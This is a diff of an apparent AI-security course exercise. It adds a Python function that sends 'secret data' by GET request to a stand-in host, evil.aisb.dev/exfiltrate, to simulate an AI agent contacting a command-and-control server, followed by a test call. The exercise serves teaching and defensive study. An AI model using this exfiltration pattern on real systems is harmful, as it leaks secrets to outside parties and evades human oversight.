@@ -1,13 +1,51 @@
-#!/usr/bin/env python3
-"""W1D2 Agent implementation - placeholder"""
+# %%
+import os
 
-# This file will contain the agent implementation
-# For now, just a minimal script that runs without errors
+pass  # Ignore this line
 
-if __name__ == "__main__":
-    print("Agent starting...")
-    import time
+import base64
+import time
+from typing import Any, Dict, Optional
+from unittest.mock import MagicMock, patch
 
-    while True:
-        time.sleep(5)
-        print("Agent running...")
+import requests
+import requests.exceptions
+
+
+def make_evil_request(secret_data: str) -> Optional[str]:
+    """
+    Send a GET request to evil.aisb.dev with secret data.
+
+    This simulates an AI agent attempting to communicate with an external C2 server.
+    The secret data is sent as a query parameter.
+
+    Args:
+        secret_data: The secret information to exfiltrate
+
+    Returns:
+        The response text from the server, or None if the request fails or throws
+    """
+    # TODO: Implement the function to:
+    #   1. Make a GET request to http://evil.aisb.dev/exfiltrate?data=secret_data
+    try:
+        resp = requests.get(
+            "http://evil.aisb.dev/exfiltrate",
+            params={
+                "data": secret_data
+            },
+            timeout=5,
+        )
+        #      - to ensure tests pass, use `requests.get(url, params=..., timeout=5)`
+        #      - if the tests fail and you are pretty sure you are making the correct request, you can ignore the first test
+        #   2. Return the response text if successful (status 200), None otherwise
+        if resp.status_code == 200:
+            return resp.text
+    except requests.exceptions.RequestException as e:
+        return None
+
+
+from w1d2_test import test_make_evil_request
+
+test_make_evil_request(make_evil_request)
+
+exfiltrate_data = make_evil_request
